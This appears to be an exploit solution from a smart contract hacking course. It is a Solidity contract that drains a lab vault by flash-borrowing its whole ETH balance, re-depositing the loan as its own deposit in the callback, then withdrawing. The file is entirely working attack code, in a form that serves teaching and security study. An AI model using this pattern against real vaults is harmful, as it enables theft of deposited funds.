// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {AdvancedVault} from "./AdvancedVault.sol";

contract AttackAdvancedVault {
    AdvancedVault advancedVault;
    uint256 count;
    uint256 total;

    constructor(address _advancedVault) {
        advancedVault = AdvancedVault(_advancedVault);
        total = address(advancedVault).balance;
    }

    function attack() external {
        advancedVault.flashLoanETH(total);
    }

    function withdraw() external payable {
        advancedVault.withdrawETH();
        msg.sender.call{value: total}("");
    }

    function callBack() external payable {
        advancedVault.depositETH{value: total}();
    }

    receive() external payable {}
}
